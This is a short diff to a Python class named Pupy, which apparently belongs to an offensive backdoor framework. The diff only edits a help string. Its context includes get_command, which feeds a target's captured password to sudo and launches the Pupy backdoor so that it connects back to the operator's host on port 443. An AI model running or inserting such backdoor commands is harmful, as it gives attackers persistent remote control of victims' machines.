@@ -12,7 +12,7 @@ class Pupy(Backdoor):
                 }
         self.modules = {} 
         self.allow_modules = True
-        self.help_text = "" 
+        self.help_text = INFO + "Uses n1nj4sec's Pupy backdoor." 
 
     def get_command(self):
         return "echo " + self.core.curtarget.pword + " | sudo -S python ~/pupy/pp.py simple --host " + self.core.localIP + ":443"
